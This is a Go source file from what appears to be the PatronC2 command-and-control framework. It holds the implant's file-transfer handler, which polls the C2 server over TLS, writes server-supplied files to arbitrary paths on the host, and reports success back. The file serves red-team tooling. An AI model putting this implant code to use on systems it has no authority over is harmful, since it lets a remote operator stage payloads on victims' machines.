package client_utils

import (
	"crypto/tls"
	"encoding/gob"
	"fmt"
	"os"
	"path/filepath"

	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
)

func HandleFileRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
	logger.Logf(logger.Info, "Sending file request")

	for {
		if err := SendRequest(encoder, types.FileRequestType, types.FileRequest{AgentID: agentID}); err != nil {
			return err
		}
		var response types.Response
		var success = "Error"
		if err := decoder.Decode(&response); err != nil {
			return fmt.Errorf("error decoding command response: %v", err)
		}
		if response.Type == types.FileResponseType {
			if fileResponse, ok := response.Payload.(types.FileResponse); ok {
				logger.Logf(logger.Info, "Recieved File Response Type: FileID: %v AgentID: %v Type: %v, Content: %v", fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, fileResponse.Chunk)
				if fileResponse.Type == "Download" {
					logger.Logf(logger.Info, "Downloading file to %v", fileResponse.Path)
					err := downloadHandler(fileResponse)
					if err != nil {
						return fmt.Errorf("Failed to download file")
					}
					success = "Success"
					err = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
					if err != nil {
						logger.Logf(logger.Error, "Error sending file transfer success: %v", err)
					}
					goto Exit 

				} else if fileResponse.Type == "Upload" {
					logger.Logf(logger.Info, "Uploading %v to server", fileResponse.Path)
				} else {
					logger.Logf(logger.Info, "No file to process, exiting")
					goto Exit
				}	
			} else {
				return fmt.Errorf("unexpected payload type for CommandResponse")
			}			
		} else {
			return fmt.Errorf("unexpected response type: %v, expected CommandResponseType", response.Type)
		}
	}
Exit:
	return nil
}

func downloadHandler(fileData types.FileResponse) error {
	dir := filepath.Dir(fileData.Path)
	if err := os.MkdirAll(dir, os.ModePerm); err != nil {
		return fmt.Errorf("failed to create directory %s: %v", dir, err)
	}

	file, err := os.Create(fileData.Path)
	if err != nil {
		return fmt.Errorf("failed to create file %s: %v", fileData.Path, err)
	}
	defer file.Close()

	_, err = file.Write(fileData.Chunk)
	if err != nil {
		return fmt.Errorf("failed to write data to file %s: %v", fileData.Path, err)
	}
	logger.Logf(logger.Info, "Successfully downloaded file to %s", fileData.Path)
	return nil
}

func fileTransferSuccessHandler(fileID string, agentID string, transferType string, success string, encoder *gob.Encoder, decoder *gob.Decoder) error {
	successReq := createSuccessRequest(fileID, agentID, transferType, success)
	if err := SendRequest(encoder, types.FileToServerType, successReq); err != nil {
		return err
	}
	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return err
	}

	if response.Type == types.FileTransferStatusResponseType {
		if configResponse, ok := response.Payload.(types.FileTransferStatusResponse); ok {
			logger.Logf(logger.Info, "Completed a file transfer: %v", configResponse)
		}
	} else {
		return fmt.Errorf("unexpected response type: %v", response.Type)
	}
	return nil
}

func createSuccessRequest(fileID string, agentID string, transferType string, success string) types.FileToServer {
	return types.FileToServer{
		FileID:    	fileID,
		AgentID:	agentID,
		Type:		transferType,
		Status:		success,
	}
}
